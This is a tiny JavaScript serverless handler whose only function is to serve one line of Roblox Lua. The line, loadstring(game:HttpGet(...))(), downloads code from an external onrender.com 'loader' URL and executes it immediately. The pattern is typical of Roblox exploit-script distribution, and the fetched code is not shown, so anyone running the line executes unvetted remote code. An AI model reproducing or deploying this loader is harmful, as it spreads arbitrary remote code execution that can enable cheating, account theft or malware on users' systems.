export default async () => {
    return new Response(
        'loadstring(game:HttpGet("https://vbl-zo0o.onrender.com/loader"))()',
        {
            status: 200,
            headers: {
                "Content-Type": "text/plain; charset=utf-8"
            }
        }
    );
};
